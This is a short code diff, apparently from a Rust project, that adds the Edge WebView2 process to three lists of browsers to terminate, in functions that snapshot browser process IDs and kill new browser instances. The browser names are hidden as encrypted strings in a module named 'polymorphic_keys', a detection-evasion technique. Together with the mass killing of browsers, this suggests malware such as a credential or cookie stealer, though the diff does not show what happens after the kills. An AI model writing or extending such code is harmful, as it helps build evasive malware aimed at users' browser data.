@@ -100,6 +100,7 @@ fn kill_browser_processes(
     let browser_exes: &[(&[u8], &[u8; 32], &[u8; 12])] = &[
         (&crate::polymorphic_keys::KILL_CHROME_ENC, &crate::polymorphic_keys::KILL_CHROME_KEY, &crate::polymorphic_keys::KILL_CHROME_NONCE),
         (&crate::polymorphic_keys::KILL_EDGE_ENC, &crate::polymorphic_keys::KILL_EDGE_KEY, &crate::polymorphic_keys::KILL_EDGE_NONCE),
+        (&crate::polymorphic_keys::KILL_MSEDGE_WEBVIEW2_ENC, &crate::polymorphic_keys::KILL_MSEDGE_WEBVIEW2_KEY, &crate::polymorphic_keys::KILL_MSEDGE_WEBVIEW2_NONCE),
         (&crate::polymorphic_keys::KILL_BRAVE_ENC, &crate::polymorphic_keys::KILL_BRAVE_KEY, &crate::polymorphic_keys::KILL_BRAVE_NONCE),
         (&crate::polymorphic_keys::KILL_VIVALDI_ENC, &crate::polymorphic_keys::KILL_VIVALDI_KEY, &crate::polymorphic_keys::KILL_VIVALDI_NONCE),
         (&crate::polymorphic_keys::KILL_OPERA_ENC, &crate::polymorphic_keys::KILL_OPERA_KEY, &crate::polymorphic_keys::KILL_OPERA_NONCE),
@@ -194,6 +195,7 @@ pub fn snapshot_browser_pids() -> Vec<u32> {
     let browser_exes: &[(&[u8], &[u8; 32], &[u8; 12])] = &[
         (&crate::polymorphic_keys::KILL_CHROME_ENC,    &crate::polymorphic_keys::KILL_CHROME_KEY,    &crate::polymorphic_keys::KILL_CHROME_NONCE),
         (&crate::polymorphic_keys::KILL_EDGE_ENC,      &crate::polymorphic_keys::KILL_EDGE_KEY,      &crate::polymorphic_keys::KILL_EDGE_NONCE),
+        (&crate::polymorphic_keys::KILL_MSEDGE_WEBVIEW2_ENC, &crate::polymorphic_keys::KILL_MSEDGE_WEBVIEW2_KEY, &crate::polymorphic_keys::KILL_MSEDGE_WEBVIEW2_NONCE),
         (&crate::polymorphic_keys::KILL_BRAVE_ENC,     &crate::polymorphic_keys::KILL_BRAVE_KEY,     &crate::polymorphic_keys::KILL_BRAVE_NONCE),
         (&crate::polymorphic_keys::KILL_VIVALDI_ENC,   &crate::polymorphic_keys::KILL_VIVALDI_KEY,   &crate::polymorphic_keys::KILL_VIVALDI_NONCE),
         (&crate::polymorphic_keys::KILL_OPERA_ENC,     &crate::polymorphic_keys::KILL_OPERA_KEY,     &crate::polymorphic_keys::KILL_OPERA_NONCE),
@@ -246,6 +248,7 @@ pub fn kill_new_browsers(before_pids: &[u32]) {
     let browser_exes: &[(&[u8], &[u8; 32], &[u8; 12])] = &[
         (&crate::polymorphic_keys::KILL_CHROME_ENC,    &crate::polymorphic_keys::KILL_CHROME_KEY,    &crate::polymorphic_keys::KILL_CHROME_NONCE),
         (&crate::polymorphic_keys::KILL_EDGE_ENC,      &crate::polymorphic_keys::KILL_EDGE_KEY,      &crate::polymorphic_keys::KILL_EDGE_NONCE),
+        (&crate::polymorphic_keys::KILL_MSEDGE_WEBVIEW2_ENC, &crate::polymorphic_keys::KILL_MSEDGE_WEBVIEW2_KEY, &crate::polymorphic_keys::KILL_MSEDGE_WEBVIEW2_NONCE),
         (&crate::polymorphic_keys::KILL_BRAVE_ENC,     &crate::polymorphic_keys::KILL_BRAVE_KEY,     &crate::polymorphic_keys::KILL_BRAVE_NONCE),
         (&crate::polymorphic_keys::KILL_VIVALDI_ENC,   &crate::polymorphic_keys::KILL_VIVALDI_KEY,   &crate::polymorphic_keys::KILL_VIVALDI_NONCE),
         (&crate::polymorphic_keys::KILL_OPERA_ENC,     &crate::polymorphic_keys::KILL_OPERA_KEY,     &crate::polymorphic_keys::KILL_OPERA_NONCE),
